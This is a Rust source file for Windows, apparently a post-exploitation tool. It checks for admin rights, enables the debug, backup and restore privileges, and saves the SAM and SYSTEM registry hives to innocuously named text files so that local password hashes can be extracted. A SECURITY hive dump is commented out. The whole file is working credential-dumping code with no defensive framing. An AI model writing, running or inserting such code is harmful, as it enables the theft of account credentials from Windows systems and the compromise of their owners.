use std::io::Error;
use std::ffi::CString;
use std::ptr::null_mut;
use std::env::{
    current_dir
};

use winapi::um::winreg::{
    RegOpenKeyExA,
    RegSaveKeyA
};

use winapi::um::minwinbase::SECURITY_ATTRIBUTES;
use winapi::um::winbase::LookupPrivilegeValueW;
use winapi::um::processthreadsapi::{
    OpenProcessToken,
    GetCurrentProcess
};
use winapi::um::handleapi::CloseHandle;
use winapi::um::winnt::{
    HANDLE,
    TOKEN_ADJUST_PRIVILEGES,
    TOKEN_QUERY,
    SE_PRIVILEGE_ENABLED,
    TOKEN_PRIVILEGES, 
    TOKEN_ELEVATION, 
    TokenElevation
};
use winapi::um::securitybaseapi::{
    GetTokenInformation,
    AdjustTokenPrivileges
};

use winapi::shared::minwindef::FALSE;
use winapi::shared::minwindef::{
    HKEY, 
};

const SE_DEBUG_NAME: [u16 ; 17] =  [83, 101, 68, 101, 98, 117, 103, 80, 114, 105, 118, 105, 108, 101, 103, 101, 0];
const SE_RESTORE_NAME: [u16 ; 19] =[83, 101, 82, 101, 115, 116, 111, 114, 101, 80, 114, 105, 118, 105, 108, 101, 103, 101, 0];
const SE_BACKUP_NAME: [u16 ; 18] = [83, 101, 66, 97, 99, 107, 117, 112, 80, 114, 105, 118, 105, 108, 101, 103, 101, 0];

// main

fn main() {

    if !is_elevated() {
        println!("Run me as Administrator!");
        return;
    }

    let current_location = current_dir().unwrap().display().to_string();

    //needed to save keys, even as SYSTEM
    let (boolean, _result) = enable_debug_privilege(SE_DEBUG_NAME.as_ptr());
    if !boolean {
        println!("{_result}");
    }    

    let (boolean, _result) = enable_debug_privilege(SE_RESTORE_NAME.as_ptr());
    if !boolean {
        println!("{_result}");
    } 

    let (boolean, _result) = enable_debug_privilege(SE_BACKUP_NAME.as_ptr());
    if !boolean {
        println!("{_result}");
    }    

    // dump SYSTEM
    let handle = open_regkey("SYSTEM".to_string());
    let dest_file = format!("{current_location}\\sistemino.txt");
    save_regkey(handle, dest_file);

    // dump SECURITY, need SYSTEM privs
    //let handle = open_regkey("SECURITY".to_string());
    //let dest_file = format!("{current_location}\\secco.txt");
    //save_regkey(handle, dest_file);

    // dump SAM
    let handle = open_regkey("SAM".to_string());
    let dest_file = format!("{current_location}\\samantha.txt");
    save_regkey(handle, dest_file);

}

// functions

//checks if you are admin
fn is_elevated() -> bool {
    let mut h_token: HANDLE = null_mut();
    let mut token_ele: TOKEN_ELEVATION = TOKEN_ELEVATION { TokenIsElevated: 0 };
    let mut size: u32 = 0u32;
    unsafe {
        OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &mut h_token);
        GetTokenInformation(
            h_token,
            TokenElevation,
            &mut token_ele as *const _ as *mut _,
            std::mem::size_of::<TOKEN_ELEVATION>() as u32,
            &mut size,
        );
        return token_ele.TokenIsElevated == 1;
    }
}


fn enable_debug_privilege(ptr_privilege: *const u16) -> (bool, String) {
    unsafe {
        let mut token = null_mut();
        let mut privilege: TOKEN_PRIVILEGES = std::mem::zeroed();

        privilege.PrivilegeCount = 1;
        privilege.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

        // test


        //test end
        let result = LookupPrivilegeValueW(null_mut(), ptr_privilege, &mut privilege.Privileges[0].Luid);
        if result == FALSE {
            return (false, format!("[x] LookupPrivilege Error: {}", Error::last_os_error()));
        } else {
            let res = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &mut token);
            if res == FALSE {
                return (false, format!("[x] OpenProcessToken Error: {}", Error::last_os_error()));
            } else {
                let token_adjust = AdjustTokenPrivileges(token, FALSE, &mut privilege, std::mem::size_of_val(&privilege) as u32, null_mut(), null_mut());
                if token_adjust == FALSE {
                    return (false, format!("[x] AdjustTokenPrivileges Error: {}", Error::last_os_error()));
                } else {
                    let close_handle = CloseHandle(token);
                    if close_handle == FALSE {
                        return (false, format!("[x] CloseHandle Error: {}", Error::last_os_error()));
                    } else {
                        return (true, format!("[!] Trying to enable debug privileges"));
                    }
                }
            }
        }
    }
}


fn open_regkey(subkey: String) -> HKEY {
    unsafe {
        let mut hkey: HKEY = std::mem::zeroed();
        let location = format!("{}", subkey);
        let cstring = CString::new(location).unwrap();

        if RegOpenKeyExA(
            0x80000002 as HKEY, //HKLM
            cstring.as_ptr(),
            0x0,
            0xF003F, //0x19 ??
            &mut hkey,
        ) != 0 {
            println!("RegOpenKeyExA error: {}", Error::last_os_error());
        }

        hkey
    }
}


fn save_regkey(key: HKEY, destination: String) {
    unsafe {
        let cstring = CString::new(destination).unwrap();
        let attr: *mut SECURITY_ATTRIBUTES = std::ptr::null_mut();
        let result = RegSaveKeyA(key, cstring.as_ptr(), attr);
        
        match result {
            0 => (),
            6 => println!("RegSaveKeyA error: 6, \"Bad handle\""),
            183 => println!("RegSaveKeyA error: 183, \"File already exist\""),
            _ => println!("RegSaveKeyA error: {result}"),
        }
    }
}


